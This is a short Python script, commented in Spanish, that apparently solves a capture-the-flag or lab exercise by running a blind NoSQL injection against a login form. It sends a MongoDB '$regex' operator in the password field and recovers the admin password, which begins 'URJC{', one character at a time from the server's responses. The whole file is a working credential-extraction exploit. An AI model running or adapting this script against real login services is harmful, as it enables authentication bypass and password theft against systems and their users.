import requests
import time  # Para manejar el cooldown

url = "https://87171cb8c403-webth-vulnerable.numa.host/login"  # Reemplaza con la URL real
password = "URJC{"  # Inicio conocido de la contraseña
characters = "}{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
cooldown = 0.5  # Cooldown entre peticiones en segundos

while True:
    found = False
    for char in characters:
        test_password = f"^{password}{char}.*"  # Expresión regular para probar la contraseña
        data = {
            "username": "admin",
            "password[$regex]": test_password  # Ajuste para inyección en la contraseña
        }
        # Enviar datos como x-www-form-urlencoded
        response = requests.post(url, data=data)

        print(f"Probing with: {test_password}")
        print(f"Status code: {response.status_code}")

        if response.status_code == 200:  # Verificar si la respuesta indica éxito
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break

        # Pausa entre solicitudes
        time.sleep(cooldown)

    if not found:  # Si no encontramos más caracteres válidos, la contraseña está completa
        print(f"[!] Password completo: {password}")
        break

